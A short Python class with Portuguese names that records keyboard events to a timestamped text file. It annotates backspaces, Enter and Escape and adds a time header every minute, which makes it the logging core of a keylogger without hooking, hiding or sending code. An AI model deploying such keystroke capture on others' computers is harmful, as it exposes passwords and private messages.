import time
import datetime

class Texto:
    def __init__(self) -> None:
        datetimeNow = datetime.datetime.now()

        self.nomeDoArquivo = str(datetimeNow.day) + "-" + str(datetimeNow.month) + "-" + str(datetimeNow.year) + "__" + str(datetimeNow.hour) + "-" + str(datetimeNow.minute) + ".txt"
        self.texto = ""
        self.initialTime = time.time()
        self.lastKey = ""
        self.sameKeyCounter = 1

        arquivo = open(self.nomeDoArquivo, "w")
        arquivo.close()
        self.setHeader()
        return
    
    def setTexto(self, str):
        # conteudo
        with open(self.nomeDoArquivo, 'r') as arquivoR:
            conteudo = arquivoR.read()
            print(conteudo)
            arquivoR.close()

        with open(self.nomeDoArquivo, 'w') as arquivoW:
            arquivoW.write(conteudo + str)
            arquivoW.close()

        # arquivo = open(self.nomeDoArquivo, "w")
        # conteudo = arquivo.read()

        # self.texto += str
            
        return
    
    def setHeader(self):
        datetimeNow = datetime.datetime.now()
        dataStr = str(datetimeNow.day) + "/" + str(datetimeNow.month) + "/" + str(datetimeNow.year)
        horaStr = str(datetimeNow.hour) +":"+str(datetimeNow.minute)
        header = "\n\n --------- [" + str(dataStr) + "|" + str(horaStr) + "] ---------\n"
        self.setTexto(header)
    
    def onKeyPress(self, key):
        self.setTexto(self.treatChar(key.name))

        if(key.name == self.lastKey):
            self.sameKeyCounter += 1
        else:
            self.sameKeyCounter = 1
        
        if(time.time() - self.initialTime > 60):
            self.setHeader()
            self.initialTime = time.time()

        if(key.name == "enter"):
            print(self.texto)

        self.lastKey = key.name
        return
    
    def treatChar(self, char):
        treatedChar = ""
        if(self.lastKey == "backspace" and char != "backspace"):
            treatedChar += "[<-" + str(self.sameKeyCounter) + "x]"

        if(len(char) == 1):
            treatedChar += char
            return treatedChar
        else:
            if(char == "space"):
                treatedChar += " "
            elif(char == "esc"):
                treatedChar += "[esc]"
            # elif(char == "enter"):
            #     return "[enter]"
            elif(char == ("rshift" or "lshift" or "shift")):
                treatedChar += "[shift]"
            elif(char == ("enter")):
                treatedChar += "[enter]\n"
            return treatedChar
    
    def resetTimer(self):
        self.timer = 0
        return
    
            
